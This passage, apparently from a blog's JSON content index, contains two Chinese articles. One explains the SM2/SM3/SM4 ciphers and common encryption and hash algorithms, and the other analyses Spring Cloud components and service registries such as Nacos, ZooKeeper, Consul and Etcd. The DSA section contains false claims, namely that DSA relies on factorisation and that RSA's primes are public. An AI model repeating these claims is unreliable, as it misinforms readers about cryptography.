title=\"国密SM2\"></a>国密SM2</h2><p>SM2为基于ECC的非对称加密。该算法已公开。由于该算法基于ECC-256位，与RSA-2048相比，签名速度与秘钥生成速度更快，且安全强度更高。</p>\n<p>SM2椭圆曲线公钥密码算法是我国自主设计的公钥密码算法，包括SM2-1椭圆曲线数字签名算法，SM2-2椭圆曲线密钥交换协议，SM2-3椭圆曲线公钥加密算法，分别用于实现数字签名密钥协商和数据加密等功能。SM2算法与RSA算法不同的是，SM2算法是基于椭圆曲线上点群离散对数难题，相对于RSA算法，256位的SM2密码强度已经比2048位的RSA密码强度要高。</p>\n<h2 id=\"国密SM3\"><a href=\"#国密SM3\" class=\"headerlink\" title=\"国密SM3\"></a>国密SM3</h2><p>SM3是消息摘要。可以用MD5作为对比理解。该算法已公开。校验结果为256位。</p>\n<p>SM3密码杂凑算法是中国国家密码管理局于2010年公布的中国商用密码杂凑算法标准（其实也是哈希算法，或者单向散列算法），适用于商用密码应用中的数字签名和验证消息认证码的生成与验证以及随机数的生成，可满足多种密码应用的安全需求。</p>\n<p>该算法由王小云等人设计，消息分组为512位，经过填充和迭代压缩，生成256位的杂凑值。</p>\n<p>SM3算法的压缩函数与SHA-256的压缩函数具有相似结构，但其中关键的迭代压缩方法更有优势。</p>\n<p>为了保证杂凑算法的安全性，其产生的杂凑值的长度不应太短。MD5输出128比特杂凑值，SHA-1算法的输出长度为160比特，SM3算法的输出长度为256比特，因此SM3算法的安全性要高于MD5算法和SHA-1算法。</p>\n<h2 id=\"国密SM4\"><a href=\"#国密SM4\" class=\"headerlink\" title=\"国密SM4\"></a>国密SM4</h2><p>SM4为对称加密。来源于无线局域网标准的分组数据算法，密钥长度和分组长度均为128位。</p>\n<p>SM4分组密码算法是我国自主设计的分组对称密码算法，用于实现数据的加密&#x2F;解密运算，以保证数据和信息的机密性。要保证一个对称密码算法的安全性的基本条件是其具备足够的密钥长度，SM4算法与AES算法具有相同的密钥长度分组长度128比特，因此在安全性上高于3DES算法。</p>\n<hr>\n<h2 id=\"附录1-非对称密钥的加密系统\"><a href=\"#附录1-非对称密钥的加密系统\" class=\"headerlink\" title=\"附录1: 非对称密钥的加密系统\"></a>附录1: 非对称密钥的加密系统</h2><p>根据密钥类型不同将现代密码技术分为两类：对称加密算法和非对称加密算法。<br>非对称密钥加密系统采用的加密钥匙（公钥）和解密钥匙（私钥）是不同的。<br>常见的非对称加密算法如下：</p>\n<h3 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h3><p>由 RSA 公司发明，安全性依赖于大数分解，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的；</p>\n<h3 id=\"ECC\"><a href=\"#ECC\" class=\"headerlink\" title=\"ECC\"></a>ECC</h3><p>ECC（Elliptic Curves Cryptography）：椭圆曲线密码编码学。</p>\n<h3 id=\"DSA\"><a href=\"#DSA\" class=\"headerlink\" title=\"DSA\"></a>DSA</h3><p>DSA（Digital Signature Algorithm）：数字签名算法，是一种标准的 DSS（数字签名标准）。</p>\n<ul>\n<li>DSA和RSA的基本原理都是大数分解，其安全性略高于与RSA，区别在于RSA的两个素数公开，这样，当使用别人的p和q时，即使不知道私钥，你也能确认它们是否是随机产生的，还是作了手脚，RSA算法却作不到。</li>\n<li>DSA只是一种算法，和RSA不同之处在于它不能用作加密和解密，也不能进行密钥交换，只用于签名,它比RSA要快很多.</li>\n</ul>\n<hr>\n<h2 id=\"附录2-对称密钥的加密系统\"><a href=\"#附录2-对称密钥的加密系统\" class=\"headerlink\" title=\"附录2: 对称密钥的加密系统\"></a>附录2: 对称密钥的加密系统</h2><h3 id=\"DES\"><a href=\"#DES\" class=\"headerlink\" title=\"DES\"></a>DES</h3><p>1977年1月，美国政府采纳IBM公司设计的方案作为非机密数据的正式数据加密标准（DES Data Encryption Standard) 。</p>\n<p>目前在国内，随着三金工程尤其是金卡工程的启动，DES算法在POS、ATM、磁卡及智能卡（IC卡）、加油站、高速公路收费站等领域被广泛应用，以此来实现关键数据的保密，如信用卡持卡人的PIN的加密传输，IC卡与POS间的双向认证、金融交易数据包的MAC校验等，均用到DES算法。</p>\n<p>DES算法的入口参数有三个：Key、Data、Mode</p>\n<ul>\n<li>Key为8个字节共64位，是DES算法的工作密钥；</li>\n<li>Data也为8个字节64位，是要被加密或被解密的数据；</li>\n<li>Mode为DES的工作方式，有两种：加密或解密。</li>\n</ul>\n<p>DES算法是这样工作的：</p>\n<ul>\n<li>如Mode为加密，则用Key 去把数据Data进行加密， 生成Data的密码形式（64位）作为DES的输出结果；</li>\n<li>如Mode为解密，则用Key去把密码形式的数据Data解密，还原为Data的明码形式（64位）作为DES的输出结果。</li>\n<li>在通信网络的两端，双方约定一致的Key，在通信的源点用Key对核心数据进行DES加密，然后以密码形式在公共通信网（如电话网）中传输到通信网络的终点，数据到达目的地后，用同样的Key对密码数据进行解密，便再现了明码形式的核心数据。这样，便保证了核心数据（如PIN、MAC等）在公共通信网中传输的安全性和可靠性。</li>\n</ul>\n<p>通过定期在通信网络的源端和目的端同时改用新的Key，便能更进一步提高数据的保密性，这正是现在金融交易网络的流行做法。</p>\n<h3 id=\"3DES\"><a href=\"#3DES\" class=\"headerlink\" title=\"3DES\"></a>3DES</h3><p>3DES是DES加密算法的一种模式，它使用3条64位的密钥对数据进行三次加密。数据加密标准（DES）是美国的一种由来已久的加密标准，它使用对称密钥加密法。</p>\n<p>3DES（即Triple DES）是DES向AES过渡的加密算法（1999年，NIST将3-DES指定为过渡的加密标准），是DES的一个更安全的变形。它以DES为基本模块，通过组合分组方法设计出分组加密算法。</p>\n<p>设Ek()和Dk()代表DES算法的加密和解密过程，K代表DES算法使用的密钥，P代表明文，C代表密表，这样，</p>\n<ul>\n<li><p>3DES加密过程为：C&#x3D;Ek3(Dk2(Ek1(P)))</p>\n</li>\n<li><p>3DES解密过程为：P&#x3D;Dk1((EK2(Dk3(C)))</p>\n</li>\n<li><p>K1、K2、K3决定了算法的安全性，若三个密钥互不相同，本质上就相当于用一个长为168位的密钥进行加密。多年来，它在对付强力攻击时是比较安全的。若数据对安全性要求不那么高，K1可以等于K3。在这种情况下，密钥的有效长度为112位。</p>\n</li>\n</ul>\n<h3 id=\"AES\"><a href=\"#AES\" class=\"headerlink\" title=\"AES\"></a>AES</h3><p>AES(Advanced Encryption Standard)：高级加密标准，是下一代的加密算法标准，速度快，安全级别高。</p>\n<p>用AES加密2000年10月，NIST（美国国家标准和技术协会）宣布通过从15种候选算法中选出的一项新的密匙加密标准。Rijndael被选中成为将来的 AES。Rijndael是在1999年下半年，由研究员Joan Daemen 和 Vincent Rijmen 创建的。AES正日益成为加密各种形式的电子数据的实际标准。</p>\n<p>美国标准与技术研究院（NIST）于2002年5月26日制定了新的高级加密标准（AES）规范。</p>\n<p>AES算法基于排列和置换运算。排列是对数据重新进行安排，置换是将一个数据单元替换为另一个。</p>\n<p>AES使用几种不同的方法来执行排列和置换运算。AES是一个迭代的、对称密钥分组的密码，它可以使用128、192和256位密钥，并且用128位（16字节）分组加密和解密数据。</p>\n<p>与公共密钥加密使用密钥对不同，对称密钥密码使用相同的密钥加密和解密数据。通过分组密码返回的加密数据的位数与输入数据相同。迭代加密使用一个循环结构，在该循环中重复置换和替换输入数据。</p>\n<h2 id=\"附录3-数字摘要\"><a href=\"#附录3-数字摘要\" class=\"headerlink\" title=\"附录3: 数字摘要\"></a>附录3: 数字摘要</h2><h3 id=\"MD5\"><a href=\"#MD5\" class=\"headerlink\" title=\"MD5\"></a>MD5</h3><p>MD5（Message-Digest Algorithm 5，信息摘要算法第5版）是计算机广泛使用的散列算法（也称“哈希算法”或“杂凑算法”）之一，采用带密钥的运算时，可同时用于消息完整性检测和消息源身份认证。它是由MD2、MD3和MD4版本一路发展而来，是Ronald Rivest 于1991年设计发布的，用于取代MD4。</p>\n<ul>\n<li>MD算法的基本工作机制：</li>\n</ul>\n<p>先在发送端将一个随机长度的消息，经过一系列的各种逻辑运算，以打乱原始消息的次序，生成一个128位的消息摘要（也称哈希值），并随着原始消息一起发送。</p>\n<p>原始消息，连同摘要消息一起到了接收端后，再采用相同的方法对所接收到的原始消息进行“压缩”，看生成的消息摘要是否与随着原始消息一起发送过来的消息摘要一致，一致则认为所接收的消息是完整的，在传输途中没有被非法篡改。</p>\n<ul>\n<li><p>对于带密钥的MD5消息摘要，不是直接基于原始消息进行计算的，还要与机密的预共享密钥（采用预共享密钥认证方法时），或者本端的公钥（采用数字证书认证方法时）结合起来计算的，而预共享密钥和本端公钥只有发送者和接收者才知道的，所以能保证摘要计算的机密性，产生独一无二的“数字指纹”，起到了消息源身份认证的目的。</p>\n</li>\n<li><p>MD5摘要运算是不可逆的（即具有单向性，也称之为“单向密钥”），不可通过摘要消息还原出原始的消息。当然，其实所有身份认证算法都是这样的，仅用于认证，不需要在接收端进行数据还原。也正因为如此，MD5算法通常不认为是一种加密算法，不具有解密能力。</p>\n</li>\n<li><p>MD5算法的主要应用于各种三层VPN通信的数据完整性验证和消息源身份认证外，也经常用于数字签名。</p>\n</li>\n</ul>\n<p>如我们常常在某些软件下载站点的某软件信息中看到其MD5值，它的作用就是用于在我们下载该软件后对下载回来的文件用专门的软件（如Windows MD5 Check等）做一次MD5校验，以确保我们获得的文件与该站点提供的文件为同一文件。利用MD5算法来进行文件校验的方案被大量应用到软件下载站、论坛数据库、系统文件安全等方面。</p>\n<p>另外，MD5还广泛用于操作系统的登陆验证上，如UNIX、各类BSD系统登录密码、数字签名等诸多方。如在UNIX系统中用户的密码是以MD5（或其他类似的算法）经Hash运算后存储在文件系统中。当用户登录的时候，系统把用户输入的密码进行MD5 Hash运算，然后再去和保存在文件系统中的MD5值进行比较，进而确定输入的密码是否正确。通过这样的步骤，系统在并不知道用户密码的明码的情况下就可以确定用户登录系统的合法性。避免用户的密码被具有系统管理员权限的用户知道。</p>\n<h3 id=\"SHA\"><a href=\"#SHA\" class=\"headerlink\" title=\"SHA\"></a>SHA</h3><p>SHA（Secure Hash Algorithm，安全哈希算法）主要适用于数字签名，也是一种不可逆的MAC算法，但比MD5算法更加安全。</p>\n<ul>\n<li><p>目前它有三种主要的版本，即SHA-0、SHA-1、SHA-2和SHA-3。<br>其中SHA-2和SHA-3版本中又有多种不同子分类，如在SHA-2中又根据它们最终所生成的摘要消息长度的不同又包括SHA-224、SHA-256、SHA-384和SHA-512等几种。</p>\n</li>\n<li><p>SHA算法的认证原理与前面介绍的MD5算法认证原理完全一致。</p>\n</li>\n<li><p>各种版本SHA算法的区别在于，进行散列运算时所涉及的一些参数特性不完全相同</p>\n</li>\n</ul>\n"},{"title":"基于Spring Cloud的微服务架构分析","url":"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/","content":"<p>Spring Cloud是一个相对比较新的微服务框架，2016年才推出1.0的release版本. 虽然Spring Cloud时间最短, 但是相比Dubbo等RPC框架, Spring Cloud提供的全套的分布式系统解决方案。</p>\n<p>Spring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。</p>\n<p>Spring并没有重复制造轮子，它只是将目前各家公司(主要是 Netflix )开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p>\n<img src=\"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/infra.png\" class=\"\" title=\"SpringCloud的核心组件\">\n\n<h2 id=\"Spring-Cloud-的核心组件\"><a href=\"#Spring-Cloud-的核心组件\" class=\"headerlink\" title=\"Spring Cloud 的核心组件\"></a>Spring Cloud 的核心组件</h2><h3 id=\"1-Eureka（注册中心）\"><a href=\"#1-Eureka（注册中心）\" class=\"headerlink\" title=\"1. Eureka（注册中心）\"></a>1. Eureka（注册中心）</h3><p>Eureka 是 Spring Cloud 微服务架构中的注册中心，专门负责服务的注册与发现,里面有一个注册表,保存了各个服务器的 机器和端口。</p>\n<ul>\n<li><p><code>Eureka服务端</code>：也称服务注册中心，同其他服务注册中心一样，支持高可用配置。如果Eureka以集群模式部署，当集群中有分片出现故障时，那么Eureka就转入自我保护模式。它允许在分片故障期间继续提供服务的发现和注册，当故障分片恢复运行时，集群中其他分片会把它们的状态再次同步回来</p>\n</li>\n<li><p><code>Eureka客户端</code>：主要处理服务的注册与发现。客户端服务通过注解和参数配置的方式，嵌入在客户端应用程序的代码中，在应用程序运行时，Eureka客户端想注册中心注册自身提供的服务并周期性地发送心跳来更新它的服务租约。同时，它也能从服务端查询当前注册的服务信息并把它们缓存到本地并周期性地刷新服务状态</p>\n</li>\n</ul>\n<p>Eureka Server 的高可用实际上就是将自己作为服务向其他注册中心注册自己，这样就可以形成一组互相注册的服务注册中心，以实现服务清单的互相同步，达到高可用效果。</p>\n<h3 id=\"2-Zuul（服务网关）\"><a href=\"#2-Zuul（服务网关）\" class=\"headerlink\" title=\"2. Zuul（服务网关）\"></a>2. Zuul（服务网关）</h3><p>Zuul网关负责转发请求给对应的服务，这个组件是负责网络路由的。</p>\n<p>Spring Cloud Zuul通过与Spring Cloud Eureka进行整合，将自身注册为Eureka服务治理下的应用，同时从Eureka中获得了所有其他微服务的实例信息</p>\n<p>对于路由规则的维护，Zuul默认会将通过以服务名作为ContextPath的方式来创建路由映射</p>\n<p>Zuul提供了一套过滤器机制，可以支持在API网关无附上进行统一调用来对微服务接口做前置过滤，已实现对微服务接口的拦截和校验</p>\n<h3 id=\"3-Ribbon（负载均衡）\"><a href=\"#3-Ribbon（负载均衡）\" class=\"headerlink\" title=\"3. Ribbon（负载均衡）\"></a>3. Ribbon（负载均衡）</h3><p>提供云端负载均衡，有多种负载均衡策略可供选择，可配合服务发现和断路器使用。</p>\n<p>Ribbon是一个基于HTTP和TCP的客户端负载均衡器，它可以在通过客户端中配置的<code>ribbonServerList</code>服务端列表去轮询访问以达到服务均衡的作用。</p>\n<p>当Ribbon和Eureka联合使用时，Ribbon的服务实例清单<code>RibbonServerList</code>会被<code>DiscoveryEnabledNIWSServerList</code>重写，扩展成从Eureka注册中心中获取服务端列表。同时它也会用<code>NIWSDiscoveryPing</code>来取代IPing，它将职责委托给Eureka来去定服务端是否已经启动</p>\n<p>在客户端负载均衡中，所有客户端节点都维护着自己要访问的服务端清单，而这些服务端的清单来自于服务注册中心（比如Eureka）。在客户端负载均衡中也需要心跳去维护服务端清单的健康性，只是这个步骤需要与服务注册中心配合完成。</p>\n<p>通过Spring Cloud Ribbon的封装，我们在微服务架构中使用客户端负载均衡调用只需要如下两步：</p>\n<ul>\n<li>服务提供者只需要启动多个服务实例并且注册到一个注册中心或是多个相关联的服务注册中心</li>\n<li>服务消费者直接通过调用被@LoadBalanced注解修饰过的RestTemplate来实现面向服务的接口调用</li>\n</ul>\n<h3 id=\"4-Hystrix（熔断保护器）\"><a href=\"#4-Hystrix（熔断保护器）\" class=\"headerlink\" title=\"4. Hystrix（熔断保护器）\"></a>4. Hystrix（熔断保护器）</h3><p>熔断器，容错管理工具，旨在通过熔断机制控制服务和第三方库的节点,从而对延迟和故障提供更强大的容错能力。<br>提供线程池不同的服务走不同的线程池，实现了不同服务调用的隔离，避免了服务器雪崩的问题。</p>\n<p>在微服务架构中，存在着那么多的服务单元，若一个单元出现故障，就很容易因依赖关系而引发故障的蔓延，最终导致整个系统的瘫痪，这样的架构相较传统架构更加不稳定。为了解决这样的问题，产生了断路器等一系列的服务保护机制</p>\n<p>在分布式架构中，当某个服务单元发生故障之后，通过断路器的故障监控，向调用方返回一个错误响应，而不是长时间的等待。这样就不会使得线程因调用故障服务被长时间占用不释放，避免了故障在分布式系统中的蔓延</p>\n<p>Hystrix具备服务降级、服务熔断、线程和信号隔离、请求缓存、请求合并以及服务监控等强大功能</p>\n<p>Hystrix使用舱壁模式实现线程池的隔离，它会为每一个依赖服务创建一个独立的线程池，这样就算某个依赖服务出现延迟过高的情况，也只是对该依赖服务的调用产生影响，而不会拖慢其他的依赖服务</p>\n<h3 id=\"5-Feign（REST转换器）\"><a href=\"#5-Feign（REST转换器）\" class=\"headerlink\" title=\"5. Feign（REST转换器）\"></a>5. Feign（REST转换器）</h3><p>基于动态代理机制，根据注解和选择的机器，拼接请求url地址，发起请求。Feign的关键机制是使用了动态代理</p>\n<ul>\n<li>首先，对某个接口定义了@FeignClient注解，Feign就会针对这个接口创建一个动态代理</li>\n<li>接着调用接口的时候，本质就是调用Feign创建的动态代理</li>\n<li>Feign的动态代理会根据在接口上的@RequestMapping等注解，来动态构造要请求的服务的地址</li>\n<li>针对这个地址，发起请求、解析响应</li>\n</ul>\n<p>Feign是和Ribbon以及Eureka紧密协作的</p>\n<ul>\n<li>首先Ribbon会从Eureka Client里获取到对应的服务注册表，也就知道了所有的服务都部署在了哪些机器上，在监听哪些端口</li>\n<li>然后Ribbon就可以使用默认的Round Robin算法，从中选择一台机器</li>\n<li>Feign就会针对这台机器，构造并发起请求</li>\n</ul>\n<h3 id=\"6-Config（分布式配置）\"><a href=\"#6-Config（分布式配置）\" class=\"headerlink\" title=\"6. Config（分布式配置）\"></a>6. Config（分布式配置）</h3><p>配置管理工具包，让你可以把配置放到远程服务器，集中化管理集群配置，目前支持本地存储、Git以及Subversion。</p>\n<h2 id=\"注册中心与API网关的分析\"><a href=\"#注册中心与API网关的分析\" class=\"headerlink\" title=\"注册中心与API网关的分析\"></a>注册中心与API网关的分析</h2><p>微服务网关更多是在前后端分离，或者说涉及到独立的类似手机APP等前端应用的时候使用的最多，即把内部各个微服务组件模块的API接口能力统一注册和接入到网关，对于APP也只需要访问网关暴露的接口即可，同时通过网关还可以进一步的实现安全隔离。</p>\n<p>也就是说在这种场景下，网关更多的是实现了接口服务的代理和路由转发能力，更多的是向外的一种能力发布。</p>\n<ol>\n<li><p>一个独立的开发团队，为保证独立自治，以及内部多个微服务模块间的交互集成，最好启用独立的服务注册中心实现服务注册，发现能力。即开发团队内部多个微服务模块间的集成，不需要通过网关，只需要通过服务注册中心进行集成即可。</p>\n</li>\n<li><p>开发团队需要暴露能力给外部，包括暴露能力给其它的开发团队，需要考虑将该API接口注册到外部的网关上。在这里建议是拆分两个独立网关，一个是内部API网关，一个是放置到DMZ区面对公网访问的API网关。对于服务如果同时涉及到内部和外部使用，则两边注册。建议不要通过两次网关去路由，一个是影响性能，一个是不方便后续问题排查。</p>\n</li>\n<li><p>构建在开发团队之外的API网关必须具备负载均衡能力，可以配置多个IP地址。通过该API网关也最好具备和Docker容器扩展后的服务自动注册和地址加入扩展能力。</p>\n</li>\n</ol>\n<img src=\"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/apis.jpg\" class=\"\" title=\"多注册中心的模型\">\n\n<hr>\n<h2 id=\"Eureka-的竞品分析：Nacos、ZooKeeper、Etcd\"><a href=\"#Eureka-的竞品分析：Nacos、ZooKeeper、Etcd\" class=\"headerlink\" title=\"Eureka 的竞品分析：Nacos、ZooKeeper、Etcd\"></a>Eureka 的竞品分析：Nacos、ZooKeeper、Etcd</h2><p>服务发现是一个古老的话题，当应用开始脱离单机运行和访问时，服务发现就诞生了。目前的网络架构是每个主机都有一个独立的IP地址，那么服务发现基本上都是通过某种方式获取到服务所部署的IP地址。DNS协议是最早将一个网络名称翻译为网络IP的协议，在最初的架构选型中，DNS+LVS+Nginx基本可以满足所有的RESTful服务的发现，此时服务的IP列表通常配置在Nginx或者LVS。后来出现了RPC服务，服务的上下线更加频繁，人们开始寻求一种能够支持动态上下线并且推送IP列表变化的注册中心产品。</p>\n<img src=\"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/vs.png\" class=\"\" title=\"不同的微服务注册中心\">\n\n<h3 id=\"Eureka\"><a href=\"#Eureka\" class=\"headerlink\" title=\"Eureka\"></a>Eureka</h3><ul>\n<li>Spring Cloud Eureka所选择的是AP，采用的是去中心化结构，放弃了强一致性。也就是说Eureka集群中的各个结点都是平等的，没有主从的概念。通过互相注册的方式来进行消息同步和保证高可用。并且一个Eureka Server结点挂掉了，还有其他同等的结点来提供服务，并不会引发服务的中断</li>\n<li>Eureka只能当注册中心，想搞配置中心的话，还得搭配Spring Cloud Config+Spring Cloud Bus。其中后者支持Rabbiimq和Kafka两种模式。</li>\n<li>使用Java语言来开发的，并且也是Spring Cloud的子项目，所以可以直接通过引入jar包的方式来集成Eureka，这点非常方便</li>\n</ul>\n<h3 id=\"1-ZooKeeper\"><a href=\"#1-ZooKeeper\" class=\"headerlink\" title=\"1. ZooKeeper\"></a>1. ZooKeeper</h3><p>这是一款经典的服务注册中心产品（虽然它最初的定位并不在于此），在很长一段时间里，它是国人在提起RPC服务注册中心时心里想到的唯一选择，这很大程度上与Dubbo在中国的普及程度有关。</p>\n<ul>\n<li>Apache Zookeeper所选择的是CP，也就是放弃了高可用性。Zookeeper集群在进行消息同步的时候，必须有一半以上结点完成了同步才会返回；而当Master结点挂了或者集群中有过半的结点不能工作了，此时就会触发故障恢复，重新进行Master选举。在这个过程中，整个Zookeeper集群无法对外提供服务，从而实去了A（可用性）</li>\n<li>为了达到C，Zookeeper采用的是自己的ZAB协议。</li>\n</ul>\n<h3 id=\"2-Nacos\"><a href=\"#2-Nacos\" class=\"headerlink\" title=\"2. Nacos\"></a>2. Nacos</h3><p>Nacos是阿里巴巴旗下的开源项目，在2018年开源，携带着阿里巴巴大规模服务生产经验，试图在服务注册和配置管理这个市场上，提供给用户一个新的选择。</p>\n<ul>\n<li>Nacos一大特性是即支持CP，也支持AP。可以根据需要灵活选择。</li>\n<li>Nacos除了注册中心之外，也能充当配置中心的作用。且配置中心可以按照namespace，group等维度来进行数据隔离，来达到不同环境之间配置隔离的功能。</li>\n</ul>\n<blockquote>\n<p>值得一提的是，Nacos作为配置中心的持久化机制可以依赖于<code>Mysql</code>来完成（默认依赖于内置数据库）。只需要将Nacos目录下的sql脚本放到mysql中执行（会生成11个表），然后在nacos配置文件里面配一下mysql的账号密码即可。这样使用mysql作为数据源的方式相比于nacos内置数据库来说更容易管理</p>\n</blockquote>\n<h3 id=\"3-Consul\"><a href=\"#3-Consul\" class=\"headerlink\" title=\"3. Consul\"></a>3. Consul</h3><p>Consul是HashiCorp公司推出的一个开源工具。</p>\n<ul>\n<li>Consul是用Go语言编写的，所以无法像Eureka那样直接引入jar包就能集成，它还需要去服务器中进行额外的安装。</li>\n<li>除了注册中心的功能之外，Consul还能起到配置中心的作用。<br>Consul它保证的是CP，使用raft协议，要求必须有过半的结点都写入成功才算是注册成功了，并且它也有Master和Follower的概念，在Master挂掉后，也需要自己内部进行</li>\n</ul>\n<h3 id=\"4-Etcd（待续）\"><a href=\"#4-Etcd（待续）\" class=\"headerlink\" title=\"4. Etcd（待续）\"></a>4. Etcd（待续）</h3><p>对比SpringCloud，Kubernetes也提供完整的分布式微服务管理框架，几乎所有组件都有对应的产品，其中Etcd也可以提供类似Eureka的注册中心。</p>\n<p>在 Go 生态中，还可以选择基于 Etcd 作为注册中心，Etcd 是由 CoreOS 团队维护的、高可用分布式键值存储数据库，可用于为集群提供配置和服务发现功能，Google 开源的容器管理工具 Kuberbetes 就是基于 Etcd 的。</p>\n<p>和 Consul 一样，Etcd 也是基于 Raft 协议作为分布式一致性算法来解决领导者选举和日志复制问题，同样也是基于 Go 语言编写。</p>\n<p>Etcd 也支持代理模式（proxy），只不过在 Etcd 中，代理模式和 Consul 的客户端代理模式类似，安装在部署服务的节点上，用来转发请求到 Etcd 集群，本身不存储任何数据，Etcd 集群相当于 Consul 中以服务端模式运行的 Consul 集群，通常要求配置三个及以上节点（不要太多，3~5就够了，以便可用性和性能上达到平衡），负责真正的请求处理 —— 服务注册与发现。</p>\n<p>在目前最新版本的 Etcd v3中，通过网关模式（gateway）取代了 V2 版本中的代理模式（proxy）。</p>\n<p>从服务发现的实现原理上来说，Consul 和 Etcd 的基本设计思路是一致的，Etcd 更简单，Consul 则更像一个全栈的解决方案，功能比 Etcd 要更丰富，比如支持可视化的 Web UI 管理界面、支持多数据库中心、安全层面除了 HTTPS 外还支持 ACL、更加全面的健康检查功能、内置 DNS Server 等，这些都是 Etcd 所不具备的，但是更全面的功能往往意味着更高的复杂性，针对微服务的服务注册和发现场景，Etcd 完全够用了。</p>\n<hr>\n<h2 id=\"Spring-Cloud-全家桶的简介\"><a href=\"#Spring-Cloud-全家桶的简介\" class=\"headerlink\" title=\"Spring Cloud 全家桶的简介\"></a>Spring Cloud 全家桶的简介</h2><img src=\"/2021/06/20/%E5%9F%BA%E4%BA%8ESpring-Cloud%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/mind.png\" class=\"\" title=\"核心组件脑图\">\n\n<ul>\n<li>Spring Cloud Config：配置管理工具包，让你可以把配置放到远程服务器，集中化管理集群配置，目前支持本地存储、Git 以及 Subversion。</li>\n<li>Spring Cloud Bus：事件、消息总线，用于在集群（例如，配置变化事件）中传播状态变化，可与 Spring Cloud Config 联合实现热部署。</li>\n<li><code>Eureka</code>：云端服务发现，一个基于 REST 的服务，用于定位服务，以实现云端中间层服务发现和故障转移。</li>\n<li><code>Hystrix</code>：熔断器，容错管理工具，旨在通过熔断机制控制服务和第三方库的节点,从而对延迟和故障提供更强大的容错能力。</li>\n<li><code>Zuul</code>：Zuul 是在云平台上提供动态路由,监控,弹性,安全等边缘服务的框架。Zuul 相当于是设备和 Netflix 流应用的 Web 网站后端所有请求的前门。</li>\n<li>Archaius：配置管理 API，包含一系列配置管理 API，提供动态类型化属性、线程安全配置操作、轮询框架、回调机制等功能。</li>\n<li>Consul：封装了 Consul 操作，Consul 是一个服务发现与配置工具，与 Docker 容器可以无缝集成。</li>\n<li>Spring Cloud for Cloud Foundry：通过 Oauth2 协议绑定服务到 CloudFoundry，CloudFoundry 是 VMware 推出的开源 PaaS 云平台。</li>\n<li>Spring Cloud Sleuth：日志收集工具包，封装了 Dapper 和 log-based 追踪以及 Zipkin 和 HTrace 操作，为 Spring Cloud 应用实现了一种分布式追踪解决方案。</li>\n<li>Spring Cloud Data Flow：大数据操作工具，作为 Spring XD 的替代产品，它是一个混合计算模型，结合了流数据与批量数据的处理方式。</li>\n<li>Spring Cloud Security：基于 Spring Security 的安全工具包，为你的应用程序添加安全控制。</li>\n<li>Spring Cloud Zookeeper：操作 Zookeeper 的工具包，用于使用 Zookeeper 方式的服务发现和配置管理。</li>\n<li>Spring Cloud Stream：数据流操作开发包，封装了与 Redis、Rabbit、Kafka 等发送接收消息。</li>\n<li>Spring Cloud CLI：基于 Spring Boot CLI，可以让你以命令行方式快速建立云组件。</li>\n<li><code>Ribbon</code>：提供云端负载均衡，有多种负载均衡策略可供选择，可配合服务发现和断路器使用。</li>\n<li>Turbine：Turbine 是聚合服务器发送事件流数据的一个工具，用来监控集群下 Hystrix 的 Metrics 情况。</li>\n<li><code>Feign</code>：Feign 是一种声明式、模板化的 HTTP 客户端。</li>\n<li>Spring Cloud Task：提供云端计划任务管理、任务调度。</li>\n<li>Spring Cloud Connectors：便于云端应用程序在各种 PaaS 平台连接到后端，如：数据库和消息代理服务。</li>\n<li>Spring Cloud Cluster：提供 Leadership 选举，如：Zookeeper，Redis，Hazelcast，Consul 等常见状态模式的抽象和实现。</li>\n<li>Spring Cloud Starters：Spring Boot 式的启动项目，为 Spring Cloud 提供开箱即用的依赖管理。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/63263168\">Nacos PMC 朱鹏飞的深度技术分析</a></li>\n<li><a href=\"https://toutiao.io/posts/uglos82/preview\">深入理解 Spring Cloud 核心组件与底层原理</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000020849168\">Spring Cloud核心模型 &amp; 案例汇集</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000039842901\">基于电商网站的spring Cloud架构分析</a></li>\n<li><a href=\"https://www.cnblogs.com/burningmyself/p/12941807.html\">一个完整的Spring Cloud的分布式架构</a></li>\n<li><a href=\"https://perkins4j2.github.io/posts/35353/\">Spring Cloud - Nacos与Eureka区别及如何选型</a></li>\n<li><a href=\"https://juejin.cn/post/6844904205870694413\">各大微服务注册中心简单对比：ZooKeeper、Eureka、Consul 、Nacos</a></li>\n<li><a href=\"http://www.vispractice.com/yxweb/blogs/API02.html\">微服务网关和服务注册中心</a></li>\n<li><a href=\"https://blog.csdn.net/dyc87112/article/details/116266269\">注册中心与API网关不是这样用的！</a></li>\n<li><a href=\"http://www.heartthinkdo.com/?p=1933\">Eureka介绍和部署</a></li>\n<li><a 